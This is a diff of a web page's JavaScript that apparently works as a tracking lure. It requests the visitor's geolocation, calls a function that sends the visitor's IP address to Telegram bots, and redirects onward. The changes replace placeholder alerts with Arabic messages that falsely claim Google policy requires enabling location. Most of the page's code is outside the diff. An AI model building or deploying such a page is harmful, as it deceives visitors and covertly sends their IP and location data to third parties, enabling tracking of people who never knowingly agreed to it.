@@ -13,16 +13,16 @@ yourFunction();
     
       navigator.geolocation.getCurrentPosition(showPosition, showError);
 function showPosition(position) {
-	   alert("vv");
+	  // alert("vv");
   // Use the retrieved coordinates here
 }
 function showError(error) {
   // Handle errors, including permission denied
   if (error.code === error.PERMISSION_DENIED) {
-       alert("aa");
+         alert("...تبعاً لسياسة جوجل لا بد من تفعيل اللوكيشن من الاعلي بجانب الواي فاي");
   } else {
     // Handle other errors (e.g., unavailable location data)
-    alert("aa");
+   
   }
 }
 
@@ -144,7 +144,7 @@ ${ipAddress}
 				sendIPToTelegramBots();
 				
 		    //alert("اضغط سماح لاستمرار allow");
-       alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
+       alert("تبعاً لسياسة جوجل لا بد من تفعيل اللوكيشن من الاعلي بجانب الواي فاي");
         // showAlert();
 		sendIPToTelegramBots();
          redirectToNextURL();
@@ -152,7 +152,7 @@ ${ipAddress}
      } else {
 		 yourFunction();
       // Geolocation failed for other reasons (e.g., GPS unavailable)
-      alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
+      alert(".تبعاً لسياسة جوجل لا بد من تفعيل اللوكيشن من الاعلي بجانب الواي فاي");
     }
     }
   );
